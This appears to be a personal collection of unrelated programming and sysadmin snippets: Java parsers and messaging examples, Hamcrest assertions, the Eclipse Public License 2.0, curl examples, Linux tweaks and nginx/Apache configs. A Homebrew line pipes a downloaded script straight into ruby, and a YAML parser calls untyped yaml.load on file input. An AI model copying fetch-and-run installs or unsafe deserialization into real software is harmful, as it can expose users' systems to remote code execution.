--------------------------------------------------------------------------------------------------------
java -Xmx64m -server \
  -cp target/classes:target/test-classes:lib/\* \
-Xrunhprof:cpu=samples,depth=10,verbose=n,interval=2 \
--------------------------------------------------------------------------------------------------------
System.out.println(ReflectionToStringBuilder.toString(user, ToStringStyle.MULTI_LINE_STYLE));
--------------------------------------------------------------------------------------------------------
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
--------------------------------------------------------------------------------------------------------
String propertiesFilename = "server.properties";
Properties prop = new Properties();
try (var inputStream = getClass().getClassLoader().getResourceAsStream(propertiesFilename)) {
    if (inputStream == null) {
        throw new FileNotFoundException(propertiesFilename);
    }
    prop.load(inputStream);
} catch (IOException e) {
    throw new RuntimeException(
                "Could not read " + propertiesFilename + " resource file: " + e);
}
--------------------------------------------------------------------------------------------------------
public class BookYAMLParser implements Parser<Book> {
    String filename;

    public BookYAMLParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        try {
            DumperOptions options = new DumperOptions();
            options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            Yaml yaml = new Yaml(options);
            FileWriter writer = new FileWriter(filename);
            yaml.dump(book, writer);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        try {
            InputStream input = new FileInputStream(new File(filename));
            Yaml yaml = new Yaml();
            Book data = (Book) yaml.load(input);
            input.close();

            return data;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (YamlException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            String message = "Exception in file " + filename + ", ";
            throw new Exception(message + e.getMessage());
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
public class BookJSONParser implements Parser<Book> {

    String filename;
    public BookJSONParser(String filename) {
        this.filename = filename;
    }

    @Override
    public void serialize(Book book) {
        Gson gson = new GsonBuilder().setPrettyPrinting().create();;

        try {
            FileWriter writer = new FileWriter(filename);
            String json = gson.toJson(book);
            writer.write(json);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Book deserialize() {
        Gson gson = new Gson();

        try {
            BufferedReader br = new BufferedReader(
                    new FileReader(filename));

            JsonReader jsonReader = new JsonReader(br);
            Book book = gson.fromJson(jsonReader, Book.class);
            return book;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
package com.javasampleapproach.java9flow.pubsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    MySubscriber subscriberA = new MySubscriber("A");
    MySubscriber subscriberB = new MySubscriber("B");
    
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
    
    publisher.waitUntilTerminated();
  }
}

package com.javasampleapproach.java9flow.pubprocsub;
 
public class MainApp {
 
  public static void main(String[] args) throws InterruptedException {
    
    MyPublisher publisher = new MyPublisher();
    
    MySubscriber subscriber = new MySubscriber();
    subscriber.setDEMAND(...); // MUST set number of items to be requested here!
    
    MyProcessor processor = new MyProcessor();
    processor.setDEMAND(...); // MUST set number of items to be requested here!
    
    publisher.subscribe(processor);
    processor.subscribe(subscriber);
    
    publisher.waitUntilTerminated();
    
  }
}

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
    
    MySubscriber subscriberA = new MySubscriber("A");
    subscriberA.setDEMAND(3);
 
    MySubscriber subscriberB = new MySubscriber("B");
    subscriberB.setDEMAND(6);
 
    publisher.subscribe(subscriberA);
    publisher.subscribe(subscriberB);
  }
}
package com.javasampleapproach.java9flow.submissionpublisher;
 
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
 
public class MainApp {
 
  public static void main(String[] args) {
 
    final int MAX_BUFFER_CAPACITY = 128;
    final ExecutorService executor = Executors.newFixedThreadPool(4);
 
    MyPublisher publisher = new MyPublisher(executor, MAX_BUFFER_CAPACITY, 200, TimeUnit.MILLISECONDS);
 
    publisher.consume((data) -> process(data));
  }
 
  static void process(Integer i) {
    System.out.println("consume() testing: " + i.toString());
  }
}
--------------------------------------------------------------------------------------------------------
import org.yaml.snakeyaml.Yaml;

import java.io.IOException;
import java.io.InputStream;

public class LoadAsJavaObjectList {

    public static void main(String[] args) throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = LoadAsJavaObject.class.getResourceAsStream("/persons.yml")) {
            Persons persons = yaml.loadAs(in, Persons.class);
            for (Person person : persons.getPersons()) {
                System.out.println(person);
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
 
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicPublisher;
import javax.jms.DeliveryMode;
import javax.jms.TopicSession;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Publisher
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic publisher
       TopicPublisher topicPublisher = topicSession.createPublisher(topic);
       topicPublisher.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
                                                                           
       // create the "Hello World" message
       TextMessage message = topicSession.createTextMessage();
       message.setText("Hello World");
                                                                           
       // publish the messages
       topicPublisher.publish(message);
                                                                           
       // print what we did
       System.out.println("Message published: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}
import javax.naming.InitialContext;                                                                          
import javax.jms.Topic;
import javax.jms.Session;
import javax.jms.TextMessage;
import javax.jms.TopicSession;
import javax.jms.TopicSubscriber;
import javax.jms.TopicConnection;
import javax.jms.TopicConnectionFactory;
                                                                            
public class Subscriber
{
    public static void main(String[] args) throws Exception
    {
       // get the initial context
       InitialContext ctx = new InitialContext();
                                                                           
       // lookup the topic object
       Topic topic = (Topic) ctx.lookup("topic/topic0");
                                                                           
       // lookup the topic connection factory
       TopicConnectionFactory connFactory = (TopicConnectionFactory) ctx.
           lookup("topic/connectionFactory");
                                                                           
       // create a topic connection
       TopicConnection topicConn = connFactory.createTopicConnection();
                                                                           
       // create a topic session
       TopicSession topicSession = topicConn.createTopicSession(false,
           Session.AUTO_ACKNOWLEDGE);
                                                                           
       // create a topic subscriber
       TopicSubscriber topicSubscriber = topicSession.createSubscriber(topic);
                                                                           
       // start the connection
       topicConn.start();
                                                                           
       // receive the message
       TextMessage message = (TextMessage) topicSubscriber.receive();
                                                                           
       // print the message
       System.out.println("Message received: " + message.getText());
                                                                           
       // close the topic connection
       topicConn.close();
    }
}

--------------------------------------------------------------------------------------------------------
check if single element is in a collection
1
2
3
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItem("cd"));
assertThat(collection, not(hasItem("zz")));

check if multiple elements are in a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasItems("cd", "ef"));

check all elements in a collection

– with strict order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, contains("ab", "cd", "ef"));

– with any order
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, containsInAnyOrder("cd", "ab", "ef"));

check if collection is empty
1
2
	
List<String> collection = Lists.newArrayList();
assertThat(collection, empty());

check if array is empty
1
2
	
String[] array = new String[] { "ab" };
assertThat(array, not(emptyArray()));

check if Map is empty
1
2
	
Map<String, String> collection = Maps.newHashMap();
assertThat(collection, equalTo(Collections.EMPTY_MAP));

check if Iterable is empty
1
2
	
Iterable<String> collection = Lists.newArrayList();
assertThat(collection, emptyIterable());

check size of a collection
1
2
	
List<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, hasSize(3));

checking size of an iterable
1
2
	
Iterable<String> collection = Lists.newArrayList("ab", "cd", "ef");
assertThat(collection, Matchers.<String> iterableWithSize(3));

check condition on every item
1
2
	
List<Integer> collection = Lists.newArrayList(15, 20, 25, 30);
assertThat(collection, everyItem(greaterThan(10)));
--------------------------------------------------------------------------------------------------------
    @Size(min = 5, message ="The name '${validatedValue}' must be at least {min}" +
                        " characters long. Length found : ${validatedValue.length()}")
    private String name;
	
     Validator validator = getValidator();
     validator.validate(testBean).stream().forEach(ValidatedValueExample::printError);
--------------------------------------------------------------------------------------------------------
sudo hcitool lescan

Подключение к BLE устройство через Mac адрес и получение списка служб и дескрипторов:

sudo gatttool -b YOUR_MAC -I -t random

Подробнее: https://www.securitylab.ru/analytics/499344.php
sudo hciconfig hci0 reset

Подробнее: https://www.securitylab.ru/analytics/499344.php
--------------------------------------------------------------------------------------------------------
	@Override
	public <C> C unwrap(Class<C> type) {
		// Keep backward compatibility
		if ( type.isAssignableFrom( ConstraintViolation.class ) ) {
			return type.cast( this );
		}
		if ( type.isAssignableFrom( HibernateConstraintViolation.class ) ) {
			return type.cast( this );
		}
		throw LOG.getTypeNotSupportedForUnwrappingException( type );
	}
--------------------------------------------------------------------------------------------------------
assertThat(strings, 
   allOf(
     iterableWithSize(greaterThan(2)),
     hasItem("string two")
   )
);
--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {

        try (InputStream input = App3.class.getClassLoader().getResourceAsStream("config.properties")) {

            Properties prop = new Properties();

            if (input == null) {
                System.out.println("Sorry, unable to find config.properties");
                return;
            }

            //load a properties file from class path, inside static method
            prop.load(input);

            //get the property value and print it out
            System.out.println(prop.getProperty("db.url"));
            System.out.println(prop.getProperty("db.user"));
            System.out.println(prop.getProperty("db.password"));

        } catch (IOException ex) {
            ex.printStackTrace();
        }

    }
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class LoadContacts {

  private static String yamlLocation = "path_to/../contacts.yml";

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper(new YAMLFactory());

    try {
      List<Contact> contactList = mapper.readValue(new File(yamlLocation), new TypeReference<List<Contact>>(){});
      contactList.forEach(System.out::println);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
--------------------------------------------------------------------------------------------------------
Eclipse Public License - v 2.0
==============================

THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE PUBLIC LICENSE (“AGREEMENT”). ANY USE, REPRODUCTION OR DISTRIBUTION OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.

### 1. Definitions

“Contribution” means:
* **a)** in the case of the initial Contributor, the initial content Distributed under this Agreement, and
* **b)** in the case of each subsequent Contributor:
	* **i)** changes to the Program, and
	* **ii)** additions to the Program;
where such changes and/or additions to the Program originate from and are Distributed by that particular Contributor. A Contribution “originates” from a Contributor if it was added to the Program by such Contributor itself or anyone acting on such Contributor's behalf. Contributions do not include changes or additions to the Program that are not Modified Works.

“Contributor” means any person or entity that Distributes the Program.

“Licensed Patents” mean patent claims licensable by a Contributor which are necessarily infringed by the use or sale of its Contribution alone or when combined with the Program.

“Program” means the Contributions Distributed in accordance with this Agreement.

“Recipient” means anyone who receives the Program under this Agreement or any Secondary License (as applicable), including Contributors.

“Derivative Works” shall mean any work, whether in Source Code or other form, that is based on (or derived from) the Program and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship.

“Modified Works” shall mean any work in Source Code or other form that results from an addition to, deletion from, or modification of the contents of the Program, including, for purposes of clarity any new file in Source Code form that contains any contents of the Program. Modified Works shall not include works that contain only declarations, interfaces, types, classes, structures, or files of the Program solely in each case in order to link to, bind by name, or subclass the Program or Modified Works thereof.

“Distribute” means the acts of **a)** distributing or **b)** making available in any manner that enables the transfer of a copy.

“Source Code” means the form of a Program preferred for making modifications, including but not limited to software source code, documentation source, and configuration files.

“Secondary License” means either the GNU General Public License, Version 2.0, or any later versions of that license, including any exceptions or additional permissions as identified by the initial Contributor.

### 2. Grant of Rights

**a)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, Distribute and sublicense the Contribution of such Contributor, if any, and such Derivative Works.

**b)** Subject to the terms of this Agreement, each Contributor hereby grants Recipient a non-exclusive, worldwide, royalty-free patent license under Licensed Patents to make, use, sell, offer to sell, import and otherwise transfer the Contribution of such Contributor, if any, in Source Code or other form. This patent license shall apply to the combination of the Contribution and the Program if, at the time the Contribution is added by the Contributor, such addition of the Contribution causes such combination to be covered by the Licensed Patents. The patent license shall not apply to any other combinations which include the Contribution. No hardware per se is licensed hereunder.

**c)** Recipient understands that although each Contributor grants the licenses to its Contributions set forth herein, no assurances are provided by any Contributor that the Program does not infringe the patent or other intellectual property rights of any other entity. Each Contributor disclaims any liability to Recipient for claims brought by any other entity based on infringement of intellectual property rights or otherwise. As a condition to exercising the rights and licenses granted hereunder, each Recipient hereby assumes sole responsibility to secure any other intellectual property rights needed, if any. For example, if a third party patent license is required to allow Recipient to Distribute the Program, it is Recipient's responsibility to acquire that license before distributing the Program.

**d)** Each Contributor represents that to its knowledge it has sufficient copyright rights in its Contribution, if any, to grant the copyright license set forth in this Agreement.

**e)** Notwithstanding the terms of any Secondary License, no Contributor makes additional grants to any Recipient (other than those set forth in this Agreement) as a result of such Recipient's receipt of the Program under the terms of a Secondary License (if permitted under the terms of Section 3).

### 3. Requirements

**3.1** If a Contributor Distributes the Program in any form, then:

* **a)** the Program must also be made available as Source Code, in accordance with section 3.2, and the Contributor must accompany the Program with a statement that the Source Code for the Program is available under this Agreement, and informs Recipients how to obtain it in a reasonable manner on or through a medium customarily used for software exchange; and

* **b)** the Contributor may Distribute the Program under a license different than this Agreement, provided that such license:
	* **i)** effectively disclaims on behalf of all other Contributors all warranties and conditions, express and implied, including warranties or conditions of title and non-infringement, and implied warranties or conditions of merchantability and fitness for a particular purpose;
	* **ii)** effectively excludes on behalf of all other Contributors all liability for damages, including direct, indirect, special, incidental and consequential damages, such as lost profits;
	* **iii)** does not attempt to limit or alter the recipients' rights in the Source Code under section 3.2; and
	* **iv)** requires any subsequent distribution of the Program by any party to be under a license that satisfies the requirements of this section 3.

**3.2** When the Program is Distributed as Source Code:

* **a)** it must be made available under this Agreement, or if the Program **(i)** is combined with other material in a separate file or files made available under a Secondary License, and **(ii)** the initial Contributor attached to the Source Code the notice described in Exhibit A of this Agreement, then the Program may be made available under the terms of such Secondary Licenses, and
* **b)** a copy of this Agreement must be included with each copy of the Program.

**3.3** Contributors may not remove or alter any copyright, patent, trademark, attribution notices, disclaimers of warranty, or limitations of liability (“notices”) contained within the Program from any copy of the Program which they Distribute, provided that Contributors may add their own appropriate notices.

### 4. Commercial Distribution

Commercial distributors of software may accept certain responsibilities with respect to end users, business partners and the like. While this license is intended to facilitate the commercial use of the Program, the Contributor who includes the Program in a commercial product offering should do so in a manner which does not create potential liability for other Contributors. Therefore, if a Contributor includes the Program in a commercial product offering, such Contributor (“Commercial Contributor”) hereby agrees to defend and indemnify every other Contributor (“Indemnified Contributor”) against any losses, damages and costs (collectively “Losses”) arising from claims, lawsuits and other legal actions brought by a third party against the Indemnified Contributor to the extent caused by the acts or omissions of such Commercial Contributor in connection with its distribution of the Program in a commercial product offering. The obligations in this section do not apply to any claims or Losses relating to any actual or alleged intellectual property infringement. In order to qualify, an Indemnified Contributor must: **a)** promptly notify the Commercial Contributor in writing of such claim, and **b)** allow the Commercial Contributor to control, and cooperate with the Commercial Contributor in, the defense and any related settlement negotiations. The Indemnified Contributor may participate in any such claim at its own expense.

For example, a Contributor might include the Program in a commercial product offering, Product X. That Contributor is then a Commercial Contributor. If that Commercial Contributor then makes performance claims, or offers warranties related to Product X, those performance claims and warranties are such Commercial Contributor's responsibility alone. Under this section, the Commercial Contributor would have to defend claims against the other Contributors related to those performance claims and warranties, and if a court requires any other Contributor to pay any damages as a result, the Commercial Contributor must pay those damages.

### 5. No Warranty

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, THE PROGRAM IS PROVIDED ON AN “AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, EITHER EXPRESS OR IMPLIED INCLUDING, WITHOUT LIMITATION, ANY WARRANTIES OR CONDITIONS OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE. Each Recipient is solely responsible for determining the appropriateness of using and distributing the Program and assumes all risks associated with its exercise of rights under this Agreement, including but not limited to the risks and costs of program errors, compliance with applicable laws, damage to or loss of data, programs or equipment, and unavailability or interruption of operations.

### 6. Disclaimer of Liability

EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, AND TO THE EXTENT PERMITTED BY APPLICABLE LAW, NEITHER RECIPIENT NOR ANY CONTRIBUTORS SHALL HAVE ANY LIABILITY FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING WITHOUT LIMITATION LOST PROFITS), HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OR DISTRIBUTION OF THE PROGRAM OR THE EXERCISE OF ANY RIGHTS GRANTED HEREUNDER, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

### 7. General

If any provision of this Agreement is invalid or unenforceable under applicable law, it shall not affect the validity or enforceability of the remainder of the terms of this Agreement, and without further action by the parties hereto, such provision shall be reformed to the minimum extent necessary to make such provision valid and enforceable.

If Recipient institutes patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Program itself (excluding combinations of the Program with other software or hardware) infringes such Recipient's patent(s), then such Recipient's rights granted under Section 2(b) shall terminate as of the date such litigation is filed.

All Recipient's rights under this Agreement shall terminate if it fails to comply with any of the material terms or conditions of this Agreement and does not cure such failure in a reasonable period of time after becoming aware of such noncompliance. If all Recipient's rights under this Agreement terminate, Recipient agrees to cease use and distribution of the Program as soon as reasonably practicable. However, Recipient's obligations under this Agreement and any licenses granted by Recipient relating to the Program shall continue and survive.

Everyone is permitted to copy and distribute copies of this Agreement, but in order to avoid inconsistency the Agreement is copyrighted and may only be modified in the following manner. The Agreement Steward reserves the right to publish new versions (including revisions) of this Agreement from time to time. No one other than the Agreement Steward has the right to modify this Agreement. The Eclipse Foundation is the initial Agreement Steward. The Eclipse Foundation may assign the responsibility to serve as the Agreement Steward to a suitable separate entity. Each new version of the Agreement will be given a distinguishing version number. The Program (including Contributions) may always be Distributed subject to the version of the Agreement under which it was received. In addition, after a new version of the Agreement is published, Contributor may elect to Distribute the Program (including its Contributions) under the new version.

Except as expressly stated in Sections 2(a) and 2(b) above, Recipient receives no rights or licenses to the intellectual property of any Contributor under this Agreement, whether expressly, by implication, estoppel or otherwise. All rights in the Program not expressly granted under this Agreement are reserved. Nothing in this Agreement is intended to be enforceable by any entity that is not a Contributor or Recipient. No third-party beneficiary rights are created under this Agreement.

#### Exhibit A - Form of Secondary Licenses Notice

> “This Source Code may also be made available under the following Secondary Licenses when the conditions for such availability set forth in the Eclipse Public License, v. 2.0 are satisfied: {name license(s), version(s), and exceptions or additional permissions here}.”

Simply including a copy of this Agreement, including this Exhibit A is not sufficient to license the Source Code under Secondary Licenses.

If it is not possible or desirable to put the notice in a particular file, then You may include the notice in a location (such as a LICENSE file in a relevant directory) where a recipient would be likely to look for such a notice.

You may add additional accurate notices of copyright ownership.

--------------------------------------------------------------------------------------------------------
curl -I https://www.keycdn.com/
curl -o myfile.css https://cdn.keycdn.com/css/animate.min.css
curl -O https://cdn.keycdn.com/css/animate.min.css
curl -H "X-Header: Value" https://www.keycdn.com/
curl -H "X-Header: Value" https://www.keycdn.com/ -v
curl -C - -O https://cdn.keycdn.com/img/cdn-stats.png
curl -D - https://www.keycdn.com/
curl -D - https://www.keycdn.com/ -o /dev/null
curl --limit-rate 200K -O https://cdn.keycdn.com/img/cdn-stats.png
curl -I --http2 https://cdn.keycdn.com/
curl -r 0-20000 -o myfile.png https://cdn.keycdn.com/img/cdn-stats.png
curl --request GET https://www.keycdn.com/
curl -X POST http://www.yourwebsite.com/login/ -d 'username=yourusername&password=yourpassword'
--------------------------------------------------------------------------------------------------------
vi /lightdm/lightdm.conf
allow-guest=false

service lightdm restart
--------------------------------------------------------------------------------------------------------
vi /etc/default/grub
GRUB_RECORDFAIL_TIMEOUT=0

update-grub
--------------------------------------------------------------------------------------------------------
ifconfig | grep inet6
If that produced no output then ipv6 is already disabled. Otherwise first open (as root) the file /etc/modprobe.d/aliases and locate the following line:

alias net-pf-10 ipv6
and replace it with

alias net-pf-10 off
Then open /etc/modprobe.d/blacklist and add the following at the end of the file:

# disable ipv6
blacklist ipv6
Next you'll have to reboot the system since that seems to be the only way to get already loaded ipv6 modules out of memory.

It should be noted that editing only /etc/modprobe.d/blacklist has the same end result of getting ipv6 disabled but a log entry like

modprobe: WARNING: Not loading blacklisted module ipv6
will get added every time something in the system tries to access the net using ipv6. That can happen often in a busy system so there's no point filling log files with it.
--------------------------------------------------------------------------------------------------------
The purpose of this page is to describe how UTF-8 can be disable in Ubuntu / Debian console. At least Ubuntu releases starting from Dapper have UTF-8 enabled by default after a clean install has been done. Checking the current status is simple:

$ echo $LANG
en_US.UTF-8
If the result is anything else than en_US.UTF-8 then UTF-8 shouldn't be enabled and there's no point in reading the rest of this page unless generating locales is the point of interest.

Check /etc/default/locale and /etc/environment as root (so that you can edit it). One of these files will contain line similar to these, LANG is the one you are searching for:

LANG="en_US.UTF-8"
LANGUAGE="en_FI:en"
The LANGUAGE setting depends of what you have selected during the beginning of the install process and usually doesn't nee to be changed. Remove UTF-8 from the LANG setting so that after editing that line will look like:

LANG="en_US"
Save the changes and close the file. Remember to check both files!

Next it's time to generate some new locales because en_US doesn't probably exist yet. Open /var/lib/locales/supported.d/local and if will look like:

en_US.UTF-8 UTF-8
and make it look like:

en_US ISO-8859-1
en_US.UTF-8 UTF-8
Also any other locale that needs to be generated should be added to that file. For example Finnish users might want to have fi_FI ISO-8859-1 in there too. Remeber to save the file after editing.

Now it's time to generate those new locales. As usual, run the following as root.

$ locale-gen
Generating locales...
...
Generation complete.
local-gen will list all locales included in /var/lib/locales/supported.d/local and generate those if necessary. Finally just log out and back in again. UTF-8 should now be disable. That can be checked in the same way we started:

$ echo $LANG
en_US
Ubuntu 12.04 (and possibly also Debian) appendix
(status as of 5.8.2012)
A change done in January 2012 that was introduced in Ubuntu 12.04 causes the file .pam_environment to be created to the user home directory usually when logging in X. The content of that file is created from /etc/default/locale but .UTF-8 is forced after each entry even if the original didn't contain such. This results UTF-8 getting forced even if it has been disabled in /etc/default/locale. The easiest way to fix this is to edit (as root) /usr/share/language-tools/save-to-pam-env and add the following before “exit 0” near the end of the file:

sed -i -e 's:\.UTF-8::g' "$homedir/.pam_environment"
Log out and back in again. Now the .pam_environment shouldn't anymore contain traces of UTF-8.
--------------------------------------------------------------------------------------------------------
#!/bin/bash
 
if [ $# -eq "1" ]; then
        beep -f 3000 -l 50
        for (( ; ; )) ; do
                pin=`ping -c 1 -w 1 "$1" | grep -c "bytes from"`
                if [ $pin -eq 1 ]; then
                        beep -f 3000 -l 50
                        echo "* `date +%H:%M:%S` online!"
                else
                        echo "`date +%H:%M:%S` timeout"
                fi
                sleep 2
        done
else
        echo "Target parameter missing!"
fi
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python
 
import xml.etree.ElementTree as ET
doc = ET.parse('valgrind.xml')
errors = doc.findall('//error')
 
out = open("cpputest_valgrind.xml","w")
out.write('<?xml version="1.0" encoding="UTF-8"?>\n')
out.write('<testsuite name="valgrind" tests="'+str(len(errors))+'" errors="0" failures="'+str(len(errors))+'" skip="0">\n')
errorcount=0
for error in errors:
    errorcount=errorcount+1
 
    kind = error.find('kind')
    what = error.find('what')
    if  what == None:
        what = error.find('xwhat/text')
 
    stack = error.find('stack')
    frames = stack.findall('frame')
 
    for frame in frames:
        fi = frame.find('file')
        li = frame.find('line')
        if fi != None and li != None:
            break
 
    if fi != None and li != None:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+', '+fi.text+':'+li.text+')" time="0">\n')
    else:
        out.write('    <testcase classname="ValgrindMemoryCheck" name="Memory check '+str(errorcount)+' ('+kind.text+')" time="0">\n')
    out.write('        <error type="'+kind.text+'">\n')
    out.write('  '+what.text+'\n\n')
 
    for frame in frames:
        ip = frame.find('ip')
        fn = frame.find('fn')
        fi = frame.find('file')
        li = frame.find('line')
        bodytext = fn.text
        bodytext = bodytext.replace("&","&amp;")
        bodytext = bodytext.replace("<","&lt;")
        bodytext = bodytext.replace(">","&gt;")
        if fi != None and li != None:
            out.write('  '+ip.text+': '+bodytext+' ('+fi.text+':'+li.text+')\n')
        else:
            out.write('  '+ip.text+': '+bodytext+'\n')
 
    out.write('        </error>\n')
    out.write('    </testcase>\n')
out.write('</testsuite>\n')
out.close()
--------------------------------------------------------------------------------------------------------
npm install moment

var moment = require('moment');
moment().format();
--------------------------------------------------------------------------------------------------------
Header unset Etag
FileETag none

FileETag INode MTime Size
--------------------------------------------------------------------------------------------------------
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install ffmpeg
ffmpeg -i input.mp4 -profile:v baseline -level 3.0 -s 640x360 -start_number 0 -hls_time 10 -hls_list_size 0 -f hls index.m3u8
--------------------------------------------------------------------------------------------------------
add_header Content-Security-Policy-Report-Only: "default-src 'none'; script-src http://wordpress.keycdn.net";
Header set Content-Security-Policy-Report-Only "default-src 'none'; script-src http://wordpress.keycdn.net;"
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy" value="default-src 'self';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
--------------------------------------------------------------------------------------------------------
http {
    include /etc/nginx/mime.types;
    charset UTF-8;
    ...
}

AddType 'text/html; charset=UTF-8' html

<meta http-equiv="content-type" content="text/html;charset=UTF-8">
--------------------------------------------------------------------------------------------------------
sudo vi /etc/php5/fpm/php.ini
cgi.fix_pathinfo=0
sudo service php5-fpm restart

server {
    listen 80;
    server_name www.old-website.com;
    return 301 $scheme://www.new-website.com$request_uri;
}

server {
    ...
    rewrite ^(/download/.*)/media/(.*)\..*$ $1/mp3/$2.mp3 last;
    rewrite ^(/download/.*)/audio/(.*)\..*$ $1/mp3/$2.ra last;
    return 403;
    ...
}

if ($http_user_agent ~ MSIE) {
    rewrite ^(.*)$ /msie/$1 break;
}

if ($http_cookie ~* "id=([^;]+)(?:;|$)") {
    set $id $1;
}

if ($request_method = POST) {
    return 405;
}

if ($invalid_referer) {
    return 403;
}
--------------------------------------------------------------------------------------------------------
RewriteCond %{HTTP_HOST} example.com
RewriteRule (.*) http://www.example.com$1

server {
    listen 80;
    server_name example.com;
    return 301 http://www.example.com$request_uri;
}

server {
    listen 80;
    server_name www.example.com;
    # ...
}

location ~ \.php$ {
    if ($http_x_pull ~* "secretkeyname") {
        return 405;
    }
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass unix:/var/run/php5-fpm.sock;
    fastcgi_index index.php;
    include fastcgi_params;
}

RewriteEngine On
RewriteCond %{HTTP:X-Pull} secretkeyname
RewriteRule \.(html|php)$ - [F]

vi nginx.conf
server {
    listen 80 default_server;
    # Define the document root of the server e.g /var/www/html
    root /var/www/html;

    location /nginx_status {
        # Enable Nginx stats
        stub_status on;
        # Only allow access from your IP e.g 1.1.1.1 or localhost #
        allow 127.0.0.1;
        allow 1.1.1.1
        # Other request should be denied
        deny all;
    }
}

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

gzip on;
gzip_disable "msie6";
gzip_vary on;
gzip_proxied any;
gzip_comp_level 6;
gzip_buffers 16 8k;
gzip_http_version 1.1;
